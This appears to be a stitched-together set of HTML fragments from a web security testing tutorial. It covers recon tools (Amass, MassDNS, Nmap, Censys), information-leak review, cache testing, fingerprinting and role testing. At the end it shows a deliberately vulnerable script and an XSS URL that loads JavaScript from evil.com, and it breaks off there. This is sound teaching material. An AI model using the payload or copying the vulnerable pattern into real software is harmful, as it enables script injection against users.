                <h4>
                       Amass is an open-source tool designed for information gathering, specifically in the context of cybersecurity and penetration testing.
                       Developed in Go, Amass focuses on the enumeration of subdomains and associated information to help security professionals, researchers,
                       and ethical hackers understand the attack surface of a target. It provides a wide range of features for discovering and mapping network assets.
                   </h4>
                   </br>

                   <h2>Key Features</h2>

                   <ol>
                       <li><strong>Subdomain Enumeration:</strong> Amass is particularly effective at discovering subdomains associated with a given domain.
                           It employs various techniques, including active DNS enumeration, brute-force subdomain guessing, and passive data sources.
                       </li>

                       <li><strong>IP Address Discovery:</strong> In addition to subdomains, Amass can identify IP addresses associated with the target domain,
                           providing a more comprehensive understanding of the network infrastructure.
                       </li>

                       <li><strong>Integration with Other Tools:</strong> Amass can be easily integrated with other security tools in the reconnaissance
                           and information gathering phase. For example, it can output results that can be piped into tools like Nmap, Masscan, or httprobe for further analysis.
                       </li>

                       <li><strong>Passive DNS Enumeration:</strong> Amass supports passive DNS data sources, allowing it to retrieve historical DNS records,
                           which can be valuable for understanding changes and trends over time.
                       </li>

                       <li><strong>API Integration:</strong> It can be configured to work with API keys from various services, such as Shodan, Censys, and others,
                           to enhance the information gathering process.
                       </li>

                       <li><strong>Flexible Output Formats:</strong> Amass supports different output formats, including plaintext, JSON, and CSV.
                           This flexibility makes it easy to integrate the tool into existing workflows and processes.
                       </li>

                       <li><strong>Recursive Enumeration:</strong> Amass can perform recursive subdomain enumeration, meaning it can discover subdomains of already identified subdomains,
                           providing a more thorough map of the target's attack surface.
                       </li>
                   </ol>

                   <p>
                       Amass is widely used by security professionals and penetration testers to conduct thorough reconnaissance before launching more targeted security assessments.
                       It helps in identifying potential vulnerabilities and areas of concern within an organization's network infrastructure.
                       As with any security tool, it is important to use Amass responsibly and in compliance with ethical guidelines and legal regulations.

              MassDNS is a C language-based tool that is simple and has high-performance DNS root resolver capability for those who seek to resolve a massive number of domain names in the order of billions. Without suitable configuration, MassDNS is steady at resolving 346000 words per second using publicly available resolvers. MassDNS tool is a single-threaded tool designed for situations in which the network scope is massive. Only finding Subdomains of the Target domain is not important; most of them aren’t live anymore, so it would be better to remove them from your list or subdomains.txt. If you perform the mass scanning, then you can filter out the active or live hosts. MassDNS is intended to be run in servers with high-speed upload and download bandwidths. Internally, the MassDNS tool uses a hash map technique to control the concurrency of domain lookups.

  <h4>Nmap, short for "Network Mapper," is a free and open-source (under the terms of the GNU General Public License) utility for network exploration and security auditing. It was designed to rapidly scan large networks, although it works fine against single hosts. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, 
  what type of packet filters/firewalls are in use, and dozens of other characteristics.
   It was designed to be a robustup to the many network hurdles thrown up by network administrators. Nmap was named "Information Security Product of the Year" by Linux Journal.</h4>

  <h3>Key Features of Nmap:</h3>
  <ul>
    <li>Host Discovery: Nmap can identify hosts on a network using a variety of techniques, such as ARP, ICMP, TCP, UDP, and others.</li>
    <li>Port Scanning: Nmap can scan for open ports on a target system and identify the services running on those ports.</li>
    <li>Version Detection: Nmap can identify the specific application version running on open ports, which can help identify potential vulnerabilities.</li>
    <li>OS Detection: Nmap can attempt to determine the operating system and version running on a target system.</li>
    <li>Scriptable Interface (NSE): Nmap supports a powerful and flexible scripting engine that allows you to write custom scripts to extend Nmap's functionality for various security assessment tasks.</li>
    <li>Performance Tuning: Nmap offers various options to adjust the timing and performance of network scans to balance speed and stealth.</li>
    <li>Output Formats: Nmap can generate output in various formats, such as plain text, XML, grepable, and others, which can be useful for further processing and analysis.</li>
    <li>Integration with Other Tools: Nmap can be easily integrated with other network security tools, such as Metasploit, for more comprehensive security assessments.</li>

  <h1>Applications in Cybersecurity</h1>
  <h4>Censys plays a crucial role in fortifying cybersecurity efforts, helping professionals identify and address security gaps in real-time.</h4>
  <p><strong>Example</strong><em>:</em>&nbsp;<br>An IT security team uses Censys to identify all devices in their organization with a specific welcome page. The Censys query <code>80.http.get.title: &quot;Welcome to Our Corporate Network&quot;</code> allows them to pinpoint devices broadcasting this potentially sensitive information, securing these endpoints promptly.</p>
  <pre>80.http.get.title: &quot;Welcome to Our Corporate Network&quot;</pre>
  </br>
  </br>
  <h1>Threat Intelligence</h1>
  <h4>Censys&rsquo;s role in threat intelligence is indispensable, allowing analysts to monitor changes in the digital landscape and stay ahead of emerging cyber threats.</h4>
  <p><strong>Example</strong><em>:</em>&nbsp;<br>A threat intelligence analyst leverages Censys to track instances of a new malware strain. The Censys query <code>tags.raw: &quot;malware&quot;</code> helps monitor changes in the behavior and distribution of affected devices, offering valuable insights into the malware&apos;s lifecycle and potential targets.</p>
  <pre>tags.raw: &quot;malware&quot;</pre>
  </br>
  </br>
  <h1>Network Administration and Monitoring</h1>
  <h4>For network administrators, Censys becomes a powerful ally in managing and securing digital assets.</h4>
  <p><strong>Example: <br></strong>A network administrator uses Censys to conduct regular scans for unauthorized IoT devices connected to the corporate network. The Censys query <code>443.https.tls.certificate.parsed.subject.organization: &quot;Unknown IoT Vendor&quot;</code> helps identify and isolate devices with certificates from an unknown vendor, ensuring the network&apos;s integrity.</p>
  <pre>443.https.tls.certificate.parsed.subject.organization: &quot;Unknown IoT Vendor&quot;</pre>
  </br>
  </br>
  <h1>API Integration and Automation</h1>
  <h4>Censys offers an API for seamless integration with existing security infrastructure, enabling automation of routine tasks.</h4>
  <p><strong>Example:<br></strong>A cybersecurity team integrates Censys&rsquo;s API with their vulnerability management system. The Censys query <code>443.https.tls.certificate.parsed.subject.organization: &quot;Expired&quot;</code> automates the identification of devices with expired SSL certificates, streamlining the patching process and reducing the window of vulnerability.</p>
  <pre>443.https.tls.certificate.parsed.subject.organization: &quot;Expired&quot;</pre>
  <blockquote>
      <p>As demonstrated by these examples, Censys stands as a dynamic force in the cybersecurity landscape. Its internet-wide scanning capabilities, coupled with applications in threat intelligence and network administration, exemplify its crucial role in fortifying digital defenses.</p>

  <h2>Test Objectives</h2>
  <ul>
      <li>Identify hidden or obfuscated paths and functionality through the analysis of metadata files.</li>
      <li>&nbsp;</li>
      <li>Extract and map other information that could lead to better understanding of the systems at hand.</li>
  </ul>
  <h2>How to Test</h2>
  <blockquote>
      <p>Any of the actions performed below with <code>wget</code> could also be done with <code>curl</code>. Many Dynamic Application Security Testing (DAST) tools such as ZAP and Burp Suite include checks or parsing for these resources as part of their spider/crawler functionality. They can also be identified using various <a href="https://en.wikipedia.org/wiki/Google_hacking">Google Dorks</a> or leveraging advanced search features such as <code>inurl:</code>.</p>
  </blockquote>
  <h3>Robots</h3>
  <p>Web Spiders, Robots, or Crawlers retrieve a web page and then recursively traverse hyperlinks to retrieve further web content. Their accepted behavior is specified by the <a href="https://www.robotstxt.org">Robots Exclusion Protocol</a> of the <a href="https://www.robotstxt.org/">robots.txt</a> file in the web root directory.</p>
  <p>As an example, the beginning of the <code>robots.txt</code> file from <a href="https://www.google.com/robots.txt">Google</a> sampled on 2020 May 5 is quoted below:</p>
  <div>
      <div>
          <pre><code>User-agent: *
  Disallow: /search
  Allow: /search/about
  Allow: /search/static
  Allow: /search/howsearchworks
  Disallow: /sdch
  ...
  </code></pre>
      </div>
  </div>
  <p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent">User-Agent</a> directive refers to the specific web spider/robot/crawler. For example, the <code>User-Agent: Googlebot</code> refers to the spider from Google while <code>User-Agent: bingbot</code> refers to a crawler from Microsoft. <code>User-Agent: *</code> in the example above applies to all <a href="https://support.google.com/webmasters/answer/6062608?visit_id=637173940975499736-3548411022&rd=1">web spiders/robots/crawlers</a>.</p>
  <p>The <code>Disallow</code> directive specifies which resources are prohibited by spiders/robots/crawlers. In the example above, the following are prohibited:</p>
  <div>
      <div>
          <pre><code>...
  Disallow: /search
  ...
  Disallow: /sdch
  ...
  </code></pre>
      </div>
  </div>
  <p>Web spiders/robots/crawlers can <a href="https://blog.isc2.org/isc2_blog/2008/07/the-attack-of-t.html">intentionally ignore</a> the <code>Disallow</code> directives specified in a <code>robots.txt</code> file, such as those from <a href="https://www.htbridge.com/news/social_networks_can_robots_violate_user_privacy.html">Social Networks</a> to ensure that shared linked are still valid. Hence, <code>robots.txt</code> should not be considered as a mechanism to enforce restrictions on how web content is accessed, stored, or republished by third parties.</p>
  <p>The <code>robots.txt</code> file is retrieved from the web root directory of the web server. For example, to retrieve the <code>robots.txt</code> from <code>www.google.com</code> using <code>wget</code> or <code>curl</code>:</p>
  <div>
      <div>
          <pre><code>$ curl -O -Ss http://www.google.com/robots.txt &amp;&amp; head -n5 robots.txt
  User-agent: *
  Disallow: /search
  Allow: /search/about
  Allow: /search/static
  Allow: /search/howsearchworks
  ...
  </code></pre>
      </div>
  </div>
  <h4>Analyze robots.txt Using Google Webmaster Tools</h4>
  <p>Web site owners can use the Google &ldquo;Analyze robots.txt&rdquo; function to analyze the website as part of its <a href="https://www.google.com/webmasters/tools">Google Webmaster Tools</a>. This tool can assist with testing and the procedure is as follows:</p>
  <ol>
      <li>Sign into Google Webmaster Tools with a Google account.</li>
      <li>&nbsp;</li>
      <li>On the dashboard, enter the URL for the site to be analyzed.</li>
      <li>&nbsp;</li>
      <li>Choose between the available methods and follow the on screen instruction.</li>
  </ol>
  <h3>META Tags</h3>
  <p><code>&lt;META&gt;</code> tags are located within the <code>HEAD</code> section of each HTML document and should be consistent across a web site in the event that the robot/spider/crawler start point does not begin from a document link other than webroot i.e. a <a href="https://en.wikipedia.org/wiki/Deep_linking">deep link</a>. Robots directive can also be specified through use of a specific <a href="https://www.robotstxt.org/meta.html">META tag</a>.</p>
  <h4>Robots META Tag</h4>
  <p>If there is no <code>&lt;META NAME=&quot;ROBOTS&quot; ... &gt;</code> entry then the &ldquo;Robots Exclusion Protocol&rdquo; defaults to <code>INDEX,FOLLOW</code> respectively. Therefore, the other two valid entries defined by the &ldquo;Robots Exclusion Protocol&rdquo; are prefixed with <code>NO...</code> i.e. <code>NOINDEX</code> and <code>NOFOLLOW</code>.</p>
  <p>Based on the Disallow directive(s) listed within the <code>robots.txt</code> file in webroot, a regular expression search for <code>&lt;META NAME=&quot;ROBOTS&quot;</code> within each web page is undertaken and the result compared to the <code>robots.txt</code> file in webroot.</p>
  <h4>Miscellaneous META Information Tags</h4>
  <p>Organizations often embed informational META tags in web content to support various technologies such as screen readers, social networking previews, search engine indexing, etc. Such meta-information can be of value to testers in identifying technologies used, and additional paths/functionality to explore and test. The following meta information was retrieved from <code>www.whitehouse.gov</code> via View Page Source on 2020 May 05:</p>

  <h3>Other .well-known Information Sources</h3>
  <p>There are other RFCs and Internet drafts which suggest standardized uses of files within the <code>.well-known/</code> directory. Lists of which can be found <a href="https://en.wikipedia.org/wiki/List_of_/.well-known/_services_offered_by_webservers">here</a> or <a href="https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml">here</a>.</p>
  <p>It would be fairly simple for a tester to review the RFC/drafts are create a list to be supplied to a crawler or fuzzer, in order to verify the existence or content of such files.</p>

    <h4>It is very common, and even recommended, for programmers to include detailed comments and metadata on their source code. However, comments and metadata included in the HTML code might reveal internal information that should not be available to potential attackers. Comments and metadata review should be done in order to determine if any information is being leaked. Additionally some applications may leak information in the body of redirect responses.</h4>
    <p>For modern web apps, the use of client-side JavaScript for the frontend is becoming more popular. Popular frontend construction technologies use client-side JavaScript like ReactJS, AngularJS, or Vue. Similar to the comments and metadata in HTML code, many programmers also hardcode sensitive information in JavaScript variables on the frontend. Sensitive information can include (but is not limited to): Private API Keys (<em>e.g.</em> an unrestricted Google Map API Key), internal IP addresses, sensitive routes (<em>e.g.</em> route to hidden admin pages or functionality), or even credentials. This sensitive information can be leaked from such frontend JavaScript code. A review should be done in order to determine if any sensitive information leaked which could be used by attackers for abuse.</p>
    <p>For large web applications, performance issues are a big concern to programmers. Programmers have used different methods to optimize frontend performance, including Syntactically Awesome Style Sheets (Sass), Sassy CSS (SCSS), webpack, etc. Using these technologies, frontend code will sometimes become harder to understand and difficult to debug, and because of it, programmers often deploy source map files for debugging purposes. A &ldquo;source map&rdquo; is a special file that connects a minified/uglified version of an asset (CSS or JavaScript) to the original authored version. Programmers are still debating whether or not to bring source map files to the production environment. However, it is undeniable that source map files or files for debugging if released to the production environment will make their source more human-readable. It can make it easier for attackers to find vulnerabilities from the frontend or collect sensitive information from it. JavaScript code review should be done in order to determine if any debug files are exposed from the frontend. Depending on the context and sensitivity of the project, a security expert should decide whether the files should exist in the production environment or not.</p>
    <h2>Test Objectives</h2>
    <ul>
      <li>Review web page comments, metadata, and redirect bodies to find any information leakage.</li>
      <li>&nbsp;</li>
      <li>Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.</li>
      <li>&nbsp;</li>
      <li>Identify if source map files or other frontend debug files exist.</li>
    </ul>
    <h2>How to Test</h2>
    <h3>Review Web Page Comments and Metadata</h3>
    <p>HTML comments are often used by the developers to include debugging information about the application. Sometimes, they forget about the comments and they leave them in production environments. Testers should look for HTML comments which start with <code>&lt;!--</code>.</p>
    <p>Check HTML source code for comments containing sensitive information that can help the attacker gain more insight about the application. It might be SQL code, usernames and passwords, internal IP addresses, or debugging information.</p>
    <div>
      <div>
          <pre><code>...
    &lt;div class=&quot;table2&quot;&gt;
    &lt;div class=&quot;col1&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;col2&quot;&gt;Mary&lt;/div&gt;
    &lt;div class=&quot;col1&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;col2&quot;&gt;Peter&lt;/div&gt;
    &lt;div class=&quot;col1&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;col2&quot;&gt;Joe&lt;/div&gt;

    &lt;!-- Query: SELECT id, name FROM app.users WHERE active=&apos;1&apos; --&gt;

    &lt;/div&gt;
    ...
    </code></pre>
      </div>
    </div>
    <p>The tester may even find something like this:</p>
    <div>
      <div>
          <pre><code>&lt;!-- Use the DB administrator password for testing:  f@keP@a$$w0rD --&gt;
    </code></pre>
      </div>
    </div>
    <p>Check HTML version information for valid version numbers and Data Type Definition (DTD) URLs</p>
    <div>
      <div>
          <pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
    </code></pre>
      </div>
    </div>
    <ul>
      <li><code>strict.dtd</code> &ndash; default strict DTD</li>
      <li>&nbsp;</li>
      <li><code>loose.dtd</code> &ndash; loose DTD</li>
      <li>&nbsp;</li>
      <li><code>frameset.dtd</code> &ndash; DTD for frameset documents</li>
    </ul>
    <p>Some <code>META</code> tags do not provide active attack vectors but instead allow an attacker to profile an application:</p>
    <div>
      <div>
          <pre><code>&lt;META name=&quot;Author&quot; content=&quot;Andrew Muller&quot;&gt;
    </code></pre>
      </div>
    </div>
    <p>A common (but not <a href="https://www.w3.org/WAI/standards-guidelines/wcag/">WCAG</a> compliant) <code>META</code> tag is <a href="https://en.wikipedia.org/wiki/Meta_refresh">Refresh</a>.</p>
    <div>
      <div>
          <pre><code>&lt;META http-equiv=&quot;Refresh&quot; content=&quot;15;URL=https://www.owasp.org/index.html&quot;&gt;
    </code></pre>
      </div>
    </div>
    <p>A common use for <code>META</code> tag is to specify keywords that a search engine may use to improve the quality of search results.</p>
    <div>
      <div>
          <pre><code>&lt;META name=&quot;keywords&quot; lang=&quot;en-us&quot; content=&quot;OWASP, security, sunshine, lollipops&quot;&gt;
    </code></pre>
      </div>
    </div>
    <p>Although most web servers manage search engine indexing via the <code>robots.txt</code> file, it can also be managed by <code>META</code> tags. The tag below will advise robots to not index and not follow links on the HTML page containing the tag.</p>
    <div>
      <div>
          <pre><code>&lt;META name=&quot;robots&quot; content=&quot;none&quot;&gt;
    </code></pre>

    <h3>Identifying JavaScript Code and Gathering JavaScript Files</h3>
    <p>Programmers often hardcode sensitive information with JavaScript variables on the frontend. Testers should check HTML source code and look for JavaScript code between <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code> tags. Testers should also identify external JavaScript files to review the code (JavaScript files have the file extension <code>.js</code> and name of the JavaScript file usually put in the <code>src</code> (source) attribute of a <code>&lt;script&gt;</code> tag).</p>
    <p>Check JavaScript code for any sensitive information leaks which could be used by attackers to further abuse or manipulate the system. Look for values such as: API keys, internal IP addresses, sensitive routes, or credentials. For example:</p>
    <div>
      <div>
          <pre><code>const myS3Credentials = {
    accessKeyId: config(&apos;AWSS3AccessKeyID&apos;),
    secretAccessKey: config(&apos;AWSS3SecretAccessKey&apos;),
    };
    </code></pre>
      </div>
    </div>
    <p>The tester may even find something like this:</p>
    <div>
      <div>
          <pre><code>var conString = &quot;tcp://postgres:1234@localhost/postgres&quot;;
    </code></pre>
      </div>
    </div>
    <p>When an API Key is found, testers can check if the API Key restrictions are set per service or by IP, HTTP referrer, application, SDK, etc.</p>
    <p>For example, if testers find a Google Map API Key, they can check if this API Key is restricted by IP or restricted only per the Google Map APIs. If the Google API Key is restricted only per the Google Map APIs, attackers can still use that API Key to query unrestricted Google Map APIs and the application owner must pay for that.</p>
    <div>
      <div>
          <pre><code>
    &lt;script type=&quot;application/json&quot;&gt;
    ...
    {&quot;GOOGLE_MAP_API_KEY&quot;:&quot;AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4&quot;, &quot;RECAPTCHA_KEY&quot;:&quot;6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0&quot;}
    ...
    &lt;/script&gt;
    </code></pre>
      </div>
    </div>
    <p>In some cases, testers may find sensitive routes from JavaScript code, such as links to internal or hidden admin pages.</p>
    <div>
      <div>
          <pre><code>&lt;script type=&quot;application/json&quot;&gt;
    ...
    &quot;runtimeConfig&quot;:{&quot;BASE_URL_VOUCHER_API&quot;:&quot;https://staging-voucher.victim.net/api&quot;, &quot;BASE_BACKOFFICE_API&quot;:&quot;https://10.10.10.2/api&quot;, &quot;ADMIN_PAGE&quot;:&quot;/hidden_administrator&quot;}
    ...
    &lt;/script&gt;
    </code></pre>
      </div>
    </div>
    <h3>Identifying Source Map Files</h3>
    <p>Source map files will usually be loaded when DevTools open. Testers can also find source map files by adding the &ldquo;.map&rdquo; extension after the extension of each external JavaScript file. For example, if a tester sees a <code>/static/js/main.chunk.js</code> file, they can then check for its source map file by visiting <code>/static/js/main.chunk.js.map</code>.</p>
    <p>Check source map files for any sensitive information that can help the attacker gain more insight about the application. For example:</p>
    <div>
      <div>
          <pre><code>{
    &quot;version&quot;: 3,
    &quot;file&quot;: &quot;static/js/main.chunk.js&quot;,
    &quot;sources&quot;: [
      &quot;/home/sysadmin/cashsystem/src/actions/index.js&quot;,
      &quot;/home/sysadmin/cashsystem/src/actions/reportAction.js&quot;,
      &quot;/home/sysadmin/cashsystem/src/actions/cashoutAction.js&quot;,
      &quot;/home/sysadmin/cashsystem/src/actions/userAction.js&quot;,
      &quot;...&quot;
    ],
    &quot;...&quot;
    }
    </code></pre>
      </div>
    </div>
    <p>When sites load source map files, the frontend source code will become readable and easier to debug.</p>
    <h3>Identify Redirect Responses which Leak Information</h3>
    <p>Although redirect responses are not generally expected to contain any significant web content there is no assurance that they cannot contain content. So, while series 300 (redirect) responses often contain &ldquo;redirecting to <code>https://example.com/</code>&rdquo; type content they may also leak content.</p>
    <p>Consider a situation in which a redirect response is the result of an authentication or authorization check, if that check fails the server may respond redirecting the user back to a &ldquo;safe&rdquo; or &ldquo;default&rdquo; page, yet the redirect response itself may still contain content which isn&rsquo;t shown in the browser but is indeed transmitted to the client. This can be seen either leveraging browser developer tools or via a personal proxy (such as ZAP, Burp, Fiddler, or Charles).</p>

      <h1>Testing for Browser Cache Weaknesses</h1>
      
      <h4>In this phase the tester checks that the application correctly instructs the browser to not retain sensitive data.</hh4>
      <p>Browsers can store information for purposes of caching and history. Caching is used to improve performance, so that previously displayed information doesn&rsquo;t need to be downloaded again. History mechanisms are used for user convenience, so the user can see exactly what they saw at the time when the resource was retrieved. If sensitive information is displayed to the user (such as their address, credit card details, Social Security Number, or username), then this information could be stored for purposes of caching or history, and therefore retrievable through examining the browser&rsquo;s cache or by simply pressing the browser&rsquo;s <strong>Back</strong> button.</p>
      <h2>Test Objectives</h2>
      <ul>
          <li>Review if the application stores sensitive information on the client-side.</li>
          <li>&nbsp;</li>
          <li>Review if access can occur without authorization.</li>
      </ul>
      <h2>How to Test</h2>
      <h3>Browser History</h3>
      <p>Technically, the <strong>Back</strong> button is a history and not a cache (see <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.13">Caching in HTTP: History Lists</a>). The cache and the history are two different entities. However, they share the same weakness of presenting previously displayed sensitive information.</p>
      <p>The first and simplest test consists of entering sensitive information into the application and logging out. Then the tester clicks the <strong>Back</strong> button of the browser to check whether previously displayed sensitive information can be accessed whilst unauthenticated.</p>
      <p>If by pressing the <strong>Back</strong> button the tester can access previous pages but not access new ones, then it is not an authentication issue, but a browser history issue. If these pages contain sensitive data, it means that the application did not forbid the browser from storing it.</p>
      <p>Authentication does not necessarily need to be involved in the testing. For example, when a user enters their email address in order to sign up to a newsletter, this information could be retrievable if not properly handled.</p>
      <p>The <strong>Back</strong> button can be stopped from showing sensitive data. This can be done by:</p>
      <ul>
          <li>Delivering the page over HTTPS.</li>
          <li>&nbsp;</li>
          <li>Setting <code>Cache-Control: must-revalidate</code></li>
      </ul>
      <h3>Browser Cache</h3>
      <p>Here testers check that the application does not leak any sensitive data into the browser cache. In order to do that, they can use a proxy (such as ZAP) and search through the server responses that belong to the session, checking that for every page that contains sensitive information the server instructed the browser not to cache any data. Such a directive can be issued in the HTTP response headers with the following directives:</p>
      <ul>
          <li><code>Cache-Control: no-cache, no-store</code></li>
          <li>&nbsp;</li>
          <li><code>Expires: 0</code></li>
          <li>&nbsp;</li>
          <li><code>Pragma: no-cache</code></li>
      </ul>
      <p>These directives are generally robust, although additional flags may be necessary for the <code>Cache-Control</code> header in order to better prevent persistently linked files on the file system. These include:</p>
      <ul>
          <li><code>Cache-Control: must-revalidate, max-age=0, s-maxage=0</code></li>
      </ul>
      <div>
          <div>
              <pre><code>HTTP/1.1:
      Cache-Control: no-cache
      </code></pre>
          </div>
      </div>
      <div>
          <div>
              <pre><code>HTTP/1.0:
      Pragma: no-cache
      Expires: &quot;past date or illegal value (e.g., 0)&quot;
      </code></pre>
          </div>
      </div>
      <p>For instance, if testers are testing an e-commerce application, they should look for all pages that contain a credit card number or some other financial information, and check that all those pages enforce the <code>no-cache</code> directive. If they find pages that contain critical information but that fail to instruct the browser not to cache their content, they know that sensitive information will be stored on the disk, and they can double-check this simply by looking for the page in the browser cache.</p>
      <p>The exact location where that information is stored depends on the client operating system and on the browser that has been used. Here are some examples:</p>
      <ul>
          <li>Mozilla Firefox: &nbsp; &nbsp;<ul>
                  <li>Unix/Linux: <code>~/.cache/mozilla/firefox/</code></li>
                  <li>&nbsp; &nbsp; &nbsp;</li>
                  <li>Windows: <code>C:\Users\&lt;user_name&gt;\AppData\Local\Mozilla\Firefox\Profiles\&lt;profile-id&gt;\Cache2\</code></li>
              </ul>
          </li>
          <li>&nbsp;</li>
          <li>Internet Explorer: &nbsp; &nbsp;<ul>
                  <li><code>C:\Users\&lt;user_name&gt;\AppData\Local\Microsoft\Windows\INetCache\</code></li>
              </ul>
          </li>
          <li>&nbsp;</li>
          <li>Chrome: &nbsp; &nbsp;<ul>
                  <li>Windows: <code>C:\Users\&lt;user_name&gt;\AppData\Local\Google\Chrome\User Data\Default\Cache</code></li>
                  <li>&nbsp; &nbsp; &nbsp;</li>
                  <li>Unix/Linux: <code>~/.cache/google-chrome</code></li>
              </ul>
          </li>
      </ul>
      <h4>Reviewing Cached Information</h4>
      <p>Firefox provides functionality for viewing cached information, which may be to your benefit as a tester. Of course the industry has also produced various extensions, and external apps which you may prefer or need for Chrome, Internet Explorer, or Edge.</p>
      <p>Cache details are also available via developer tools in most modern browsers, such as <a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector#Cache_Storage">Firefox</a>, <a href="https://developers.google.com/web/tools/chrome-devtools/storage/cache">Chrome</a>, and Edge. With Firefox it is also possible to use the URL <code>about:cache</code> to check cache details.</p>
      <h4>Check Handling for Mobile Browsers</h4>
      <p>Handling of cache directives may be completely different for mobile browsers. Therefore, testers should start a new browsing session with clean caches and take advantage of features like Chrome&rsquo;s <a href="https://developers.google.com/web/tools/chrome-devtools/device-mode">Device Mode</a> or Firefox&rsquo;s <a href="https://developer.mozilla.org/en-US/docs/Tools/Responsive_Design_Mode">Responsive Design Mode</a> to re-test or separately test the concepts outlined above.</p>
      <p>Additionally, personal proxies such as ZAP and Burp Suite allow the tester to specify which <code>User-Agent</code> should be sent by their spiders/crawlers. This could be set to match a mobile browser <code>User-Agent</code> string and used to see which caching directives are sent by the application being tested.</p>
      <h3>Gray-Box Testing</h3>
      <p>The methodology for testing is equivalent to the black-box case, as in both scenarios testers have full access to the server response headers and to the HTML code. However, with gray-box testing, the tester may have access to account credentials that will allow them to test sensitive pages that are accessible only to authenticated users.</p>

    <sl-details summary="USER AGENT" open>
       <h4>A User Agent (UA) is a string sent by a web browser or other client to a web server that identifies the client software, operating system, and other relevant details about the device making the request.</h4>
    <p>User agents are typically used by websites to tailor content and services to specific devices or browsers. They also help in web analytics, load testing, and monitoring user interactions. Security researchers often analyze user agents to identify potential vulnerabilities or anomalous behavior.</p>

    <h2>Common Uses of User Agents</h2>
    <ul>
        <li><strong>Device Identification:</strong> Web servers use the UA to detect the type of device or browser making the request (e.g., mobile, desktop).</li>
        <li><strong>Content Customization:</strong> Websites may serve different content or layouts based on the user agent string.</li>
        <li><strong>Browser Compatibility:</strong> UA strings help servers check if the client's browser supports certain features, like HTML5 or CSS3.</li>
        <li><strong>Security and Logging:</strong> User agents can be used to detect unusual activity or bot traffic.</li>
    </ul>

    <h2>Example of a User Agent String</h2>
    <p>A typical User-Agent string might look like this:</p>
    <pre>
        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

      <h4>Web server fingerprinting is the process of identifying the software and version running on a web server by analyzing various clues that can be found in HTTP responses, headers, or other exposed information.</h4>
    <p>Fingerprinting a web server is an essential step in web application security assessments, as it helps security professionals understand the potential vulnerabilities associated with the server software. By identifying the web server, its version, and configurations, attackers and defenders alike can focus on the most relevant weaknesses or attack vectors.</p>

    <h2>Methods of Web Server Fingerprinting</h2>
    <ul>
        <li><strong>HTTP Headers:</strong> Analyzing headers like "Server" can provide clues about the web server type and version. For example, Apache or Nginx servers may expose information like "Apache/2.4.41 (Unix)" in the "Server" header.</li>
        <li><strong>Responses to Specific Requests:</strong> Certain servers have unique responses to common HTTP requests. For instance, the default page or error messages may reveal the server's identity.</li>
        <li><strong>DNS Queries:</strong> Reverse DNS lookups or specific subdomains (like "server1" or "admin") can sometimes indicate server information.</li>
        <li><strong>Fingerprinting Tools:</strong> Specialized tools can automate the process of identifying server types and versions by analyzing server responses and behaviors.</li>
    </ul>

    <h2>Nikto Tool for Web Server Fingerprinting</h2>
    <p>Nikto is an open-source web server scanner that is widely used for discovering vulnerabilities in web servers, including identifying the server type and version.

      <h4>Applications have several types of functionalities and services, and those require access permissions based on the needs of the user. That user could be:</h4>
      <ul>
          <li>an administrator, where they manage the application functionalities.</li>
          <li>an auditor, where they review the application transactions and provide a detailed report.</li>
          <li>a support engineer, where they help customers debug and fix issues on their accounts.</li>
          <li>a customer, where they interact with the application and benefit from its services.</li>
      </ul>
      </br>
      <h2>Test Objectives</h2>
      <ul>
          <li>Identify and document roles used by the application.</li>
          <li>Attempt to switch, change, or access another role.</li>
          <li>Review the granularity of the roles and the needs behind the permissions given.</li>
      </ul>
      </br>
      <h2>How to Test</h2>
      <h3>Roles Identification</h3>
      <p>The tester should start by identifying the application roles being tested through any of the following methods:</p>
      <ul>
          <li>Application documentation.</li>
          <li>Guidance by the developers or administrators of the application.</li>
          <li>Application comments.</li>
          <li>Fuzz possible roles: &nbsp; &nbsp;<ul>
                  <li>cookie variable (<em>e.g.</em> <code>role=admin</code>, <code>isAdmin=True</code>)</li>
                  <li>account variable (<em>e.g.</em> <code>Role: manager</code>)</li>
                  <li>hidden directories or files (<em>e.g.</em> <code>/admin</code>, <code>/mod</code>, <code>/backups</code>)</li>
                  <li>switching to well known users (<em>e.g.</em> <code>admin</code>, <code>backups</code>, etc.)</li>
              </ul>
          </li>
      </ul>
      <h3>Switching to Available Roles</h3>
      <p>After identifying possible attack vectors, the tester needs to test and validate that they can access the available roles.</p>
      <blockquote>
          <p>Some applications define the roles of the user on creation, through rigorous checks and policies, or by ensuring that the user&rsquo;s role is properly protected through a signature created by the backend. Finding that roles exist doesn&rsquo;t mean that they&rsquo;re a vulnerability.</p>

      <h4>A client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. 
      The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. 
      This vulnerability makes it is possible to interfere with the expected application&rsquo;s behavior by causing it to load and render malicious objects.</h4></br>
      <p>The following JavaScript code shows a possible vulnerable script in which an attacker is able to control the <code>location.hash</code> (source) which reaches the attribute <code>src</code> of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.</p>
      <div>
          <div>
              <pre><code>&lt;script&gt;
          var d=document.createElement(&quot;script&quot;);
          if(location.hash.slice(1)) {
              d.src = location.hash.slice(1);
          }
          document.body.appendChild(d);
      &lt;/script&gt;
      </code></pre>
          </div>
      </div>
      <p>An attacker could target a victim by causing them to visit this URL:</p>
      <p><code>www.victim.com/#http://evil.com/js.js</code></p>
      <p>Where <code>js.js</code> contains:</p>
